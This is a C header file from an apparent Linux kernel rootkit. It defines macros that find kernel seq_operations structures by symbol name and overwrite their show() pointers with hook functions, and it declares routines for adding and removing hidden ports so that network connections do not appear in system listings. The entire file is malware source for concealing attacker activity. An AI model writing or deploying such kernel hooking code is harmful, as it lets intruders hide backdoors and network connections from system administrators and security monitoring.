#ifndef _ROOTKIT_NET_H_
#define _ROOTKIT_NET_H_

#include "hooking.h"
#include <linux/seq_file.h>
#include <net/sock.h>

#define __SETUP_NET_HOOK(_seq_ops_name, _seq_ops_ptr, _seq_show_name, _seq_show_ptr, \
                         _seq_show_hook)                                             \
    do {                                                                             \
        IF_L (_seq_ops_ptr == NULL) {                                                \
            _seq_ops_ptr = (struct seq_operations *)lookup_name(#_seq_ops_name);     \
        }                                                                            \
        IF_U (_seq_ops_ptr == NULL) {                                                \
            pr_dev_err("  * Failed to get `" #_seq_ops_name "` address\n");          \
        }                                                                            \
        else {                                                                       \
            pr_dev_info("  * " #_seq_ops_name ": %p\n", _seq_ops_ptr);               \
            IF_L (_seq_show_ptr == NULL) {                                           \
                _seq_show_ptr = _seq_ops_ptr->show;                                  \
                pr_dev_info("  * " #_seq_show_name ": %p\n", _seq_show_ptr);         \
                change_protected_value(&_seq_ops_ptr->show, _seq_show_hook);         \
            }                                                                        \
        }                                                                            \
    } while (0)

#define SETUP_NET_HOOK(_seq_ops_name, _seq_show_name, _seq_show_hook)                           \
    __SETUP_NET_HOOK(_seq_ops_name, p_##_seq_ops_name, _seq_show_name, p_orig_##_seq_show_name, \
                     _seq_show_hook)

typedef struct sock sock_t;
typedef struct seq_file seq_file_t;

typedef struct port_list_tag {
    struct list_head list;    // Port linked list head
    unsigned short ui16_port; // Port number
} port_list_t;

typedef int (*seq_show_t)(seq_file_t *seq, void *v);

/**
 * Add a port to the list of hidden ports.
 *
 * @param ui16_port The port number
 * @return `0` on success, otherwise an error code
 */
int add_hidden_port(unsigned short ui16_port);

/**
 * Remove a port from the list of hidden ports.
 *
 * @param ui16_port The port number
 * @return `0` on success, otherwise an error code (should always succeed)
 */
int del_hidden_port(unsigned short ui16_port);

/**
 * Initialize the network hooks (to hide network connections).
 */
void init_nethooks(void);

/**
 * Cleanup the network hooks (restore the original `seq_show()` functions).
 */
void cleanup_nethooks(void);

#endif
